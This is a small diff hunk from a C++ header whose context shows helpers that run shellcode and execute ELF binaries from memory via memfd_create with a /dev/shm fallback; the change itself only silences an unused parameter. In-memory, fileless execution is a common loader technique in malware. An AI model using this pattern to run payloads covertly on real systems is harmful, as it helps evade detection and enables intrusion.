@@ -134,6 +134,7 @@ inline bool run_shellcode(const std::vector<unsigned char>& shellcode, std::stri
 #else
 // Execute ELF Binary on Linux via memfd_create with fallback to /dev/shm
 inline bool run_binary(const std::vector<unsigned char>& binary, const std::string& args = "") {
+    (void)args;   // the argv override is honoured by the Windows path only
     if (binary.empty()) return false;
 
     // Try to create an anonymous file in memory (Modern Linux, Kernel 3.17+)
